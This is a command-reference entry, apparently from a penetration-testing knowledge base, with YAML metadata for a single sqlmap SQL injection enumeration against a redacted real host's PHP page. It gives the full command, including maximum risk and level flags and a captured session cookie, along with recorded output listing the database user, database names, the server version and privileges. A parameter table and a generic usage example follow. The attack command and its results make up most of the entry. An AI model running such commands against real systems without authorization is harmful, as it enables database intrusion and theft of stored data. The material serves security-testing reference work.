---
id: cmd-uuid-6
data: >-
  python sqlmap.py -u "https://████████:443/elist/viewem6.php"
  --data="rememail=test@att.net" --level=5 --risk=3 --users --dbs -b --hostname
  --current-db --privileges --is-dba
  --cookie="v1st=A9532F64A9E711AF;PHPSESSID=1796d85a30d3addf5934c1f0fafec529"
tags:
  - sqli
  - enumeration
type: command
output: >-
  Users: ('ntmsender'@'localhost'); DBs: information_schema, mtlist; Banner:
  5.6.36; Hostname: ██████; Privileges: USAGE
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:14.942Z'
verified: false
validated: true
submitted: true
---
# sqlmap Enumerate

## Command

```bash
python sqlmap.py -u "https://████████:443/elist/viewem6.php" --data="rememail=test@att.net" --level=5 --risk=3 --users --dbs -b --hostname --current-db --privileges --is-dba --cookie="v1st=A9532F64A9E711AF;PHPSESSID=1796d85a30d3addf5934c1f0fafec529"
```

## Description

Automates blind SQLi detection and enumeration of DB elements using time/boolean techniques.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -u | Target URL | Yes |
| --data | POST data | Yes |
| --level=5 | Testing thoroughness | Yes |
| --risk=3 | Payload risk level | Yes |
| --users | Enumerate users | No |
| --dbs | List databases | No |
| -b | Banner info | No |
| --hostname | Server hostname | No |
| --current-db | Current database | No |
| --privileges | User privileges | No |
| --is-dba | Check DBA status | No |
| --cookie | Session cookies | Yes |

## Examples

### Basic Usage

```bash
# As above
```

### Advanced Usage

```bash
python sqlmap.py -u "URL" --data="data" --level=5 --risk=3 --dbs --users
```

## Expected Output

Detailed enumeration: users, dbs, banner, hostname, privileges.

## Related

- [[procedures/Automate-Enumeration-with-sqlmap]]
